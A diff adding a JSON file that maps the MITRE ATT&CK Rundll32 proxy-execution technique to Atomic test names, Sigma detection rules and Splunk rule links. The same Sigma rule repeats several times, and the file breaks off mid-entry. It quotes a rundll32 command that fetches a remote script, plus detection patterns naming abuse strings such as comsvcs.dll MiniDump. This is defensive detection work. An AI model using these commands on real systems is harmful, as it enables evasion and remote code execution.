@@ -1,0 +1,1139 @@
+{
+    "id": "T1218.011",
+    "name": "Rundll32",
+    "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: `rundll32.exe {DLLname, DLLfunction}`).\nRundll32.exe can also be used to execute [Control Panel](T1218.002) Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:\"..mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"`  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading `ExampleFunction`). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "File: File Metadata, Process: Process Creation, Command: Command Execution, Module: Module Load",
+    "detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
+    "url": "https://attack.mitre.org/techniques/T1218/011",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "e4c04b6f-c492-4782-82c7-3bf75eb8077e",
+                "atomic_attack_name": "Rundll32 with Control_RunDLL",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Rundll32 Control RunDLL Hunt",
+                        "rule_link": "https://research.splunk.com/endpoint/c8e7ced0-10c5-11ec-8b03-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "9fd5a74b-ba89-482a-8a3e-a5feaa3697b0",
+                "atomic_attack_name": "Rundll32 with Ordinal Value",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "DLL Call by Ordinal Via Rundll32.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml",
+                        "remote_content": "title: DLL Call by Ordinal Via Rundll32.EXE\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\nstatus: stable\ndescription: Detects calls of DLLs exports by ordinal numbers via rundll32.dll.\nreferences:\n    - https://web.archive.org/web/20200530031906/https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n    - https://github.com/Neo23x0/DLLRunner\n    - https://twitter.com/cyb3rops/status/1186631731543236608\n    - https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-10-22\nmodified: 2024-07-16\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - ',#'\n            - ', #'\n            - '.dll #'  # Sysmon removes , in its log\n            - '.ocx #'  # HermeticWizard\n    filter_optional_edge:\n        CommandLine|contains|all:\n            - 'EDGEHTML.dll'\n            - '#141'\n    filter_optional_vsbuild_dll:\n        ParentImage|contains:\n            - '\\Msbuild\\Current\\Bin\\'\n            - '\\VC\\Tools\\MSVC\\'\n            - '\\Tracker.exe'\n        CommandLine|contains:\n            - '\\FileTracker32.dll,#1'\n            - '\\FileTracker32.dll\",#1'\n            - '\\FileTracker64.dll,#1'\n            - '\\FileTracker64.dll\",#1'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment.\n    - Windows control panel elements have been identified as source (mmc).\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "RunDLL Loading DLL By Ordinal",
+                        "rule_link": "https://research.splunk.com/endpoint/6c135f8d-5e60-454e-80b7-c56eed739833/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
+                "atomic_attack_name": "Execution of non-dll using rundll32.exe",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Rundll32 Execution With Image Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_execution_with_image_extension.yml",
+                        "remote_content": "title: Suspicious Rundll32 Execution With Image Extension\nid: 4aa6040b-3f28-44e3-a769-9208e5feb5ec\nrelated:\n    - id: 089fc3d2-71e8-4763-a8a5-c97fbb0a403e\n      type: similar\nstatus: test\ndescription: Detects the execution of Rundll32.exe with DLL files masquerading as image files\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.bmp'\n            - '.cr2'\n            - '.eps'\n            - '.gif'\n            - '.ico'\n            - '.jpeg'\n            - '.jpg'\n            - '.nef'\n            - '.orf'\n            - '.png'\n            - '.raw'\n            - '.sr2'\n            - '.tif'\n            - '.tiff'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Potentially Suspicious PowerShell Child Processes",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+                        "remote_content": "title: Potentially Suspicious PowerShell Child Processes\nid: e4b6d2a7-d8a4-4f19-acbd-943c16d90647\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes spawned by PowerShell.\n    Use this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\nreferences:\n    - https://twitter.com/ankit_anubhav/status/1518835408502620162\nauthor: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2022-04-26\nmodified: 2024-07-16\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    filter_optional_amazon:\n        ParentCommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n        CommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n    filter_main_certutil_verify_store:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-verifystore '\n    filter_main_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains:\n            - 'qfe list'\n            - 'diskdrive '\n            - 'csproduct '\n            - 'computersystem '\n            - ' os '\n            - ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are to be expected from PowerShell scripts that might make use of additional binaries such as \"mshta\", \"bitsadmin\", etc. Apply additional filters for those scripts.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Rundll32 Execution With Uncommon DLL Extension",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml",
+                        "remote_content": "title: Rundll32 Execution With Uncommon DLL Extension\nid: c3a99af4-35a9-4668-879e-c09aeb4f2bdf\nstatus: test\ndescription: Detects the execution of rundll32 with a command line that doesn't contain a common extension\nreferences:\n    - https://twitter.com/mrd0x/status/1481630810495139841?s=12\nauthor: Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou\ndate: 2022-01-13\nmodified: 2024-04-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    filter_main_null:\n        CommandLine: null\n    filter_main_empty:\n        CommandLine: ''\n    filter_main_known_extension:\n        - CommandLine|contains:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl '\n              - '.cpl,'\n              - '.cpl\"'\n              - \".cpl'\"\n              - '.dll '\n              - '.dll,'\n              - '.dll\"'\n              - \".dll'\"\n              - '.inf '\n              - '.inf,'\n              - '.inf\"'\n              - \".inf'\"\n        - CommandLine|endswith:\n              # Note: This aims to cover: single and double quotes in addition to spaces and comma \",\" usage.\n              - '.cpl'\n              - '.dll'\n              - '.inf'\n    filter_main_localserver:\n        CommandLine|contains: ' -localserver '\n    filter_main_zzzzInvokeManagedCustomActionOutOfProc:\n        ParentImage|endswith: '\\msiexec.exe'\n        CommandLine|contains|all:\n            - ':\\Windows\\Installer\\'\n            - '.tmp'\n            - 'zzzzInvokeManagedCustomActionOutOfProc'\n    filter_optional_EdgeUpdate:\n        ParentCommandLine|contains|all:\n            - ':\\Users\\'\n            - '\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{'\n            - '\\EDGEMITMP_'\n            - '.tmp\\setup.exe'\n            - '--install-archive='\n            - '--previous-version='\n            - '--msedgewebview --verbose-logging --do-not-launch-msedge --user-level'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "User Discovery With Env Vars PowerShell",
+                        "rule_link": "https://research.splunk.com/endpoint/0cdf318b-a0dd-47d7-b257-c621c0247de8/"
+                    },
+                    {
+                        "rule_name": "Suspicious Rundll32 StartW",
+                        "rule_link": "https://research.splunk.com/endpoint/9319dda5-73f2-4d43-a85a-67ce961bddb7/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "71d771cd-d6b3-4f34-bc76-a63d47a10b19",
+                "atomic_attack_name": "Rundll32 setupapi.dll Execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Rundll32 Application Control Bypass - setupapi",
+                        "rule_link": "https://research.splunk.com/endpoint/61e7b44a-6088-4f26-b788-9a96ba13b37a/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "41fa324a-3946-401e-bbdd-d7991c628125",
+                "atomic_attack_name": "Rundll32 syssetup.dll Execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Rundll32 Application Control Bypass - syssetup",
+                        "rule_link": "https://research.splunk.com/endpoint/71b9bf37-cde1-45fb-b899-1b0aa6fa1183/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "5e46a58e-cbf6-45ef-a289-ed7754603df9",
+                "atomic_attack_name": "Rundll32 ieadvpack.dll Execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
+                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect Rundll32 Application Control Bypass - advpack",
+                        "rule_link": "https://research.splunk.com/endpoint/4aefadfe-9abd-4bf8-b3fd-867e9ef95bf8/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.011",
+                "atomic_attack_guid": "d91cae26-7fc1-457b-a854-34c8aad48c89",
+                "atomic_attack_name": "Rundll32 advpack.dll Execution",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potentially Suspicious Rundll32 Activity",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
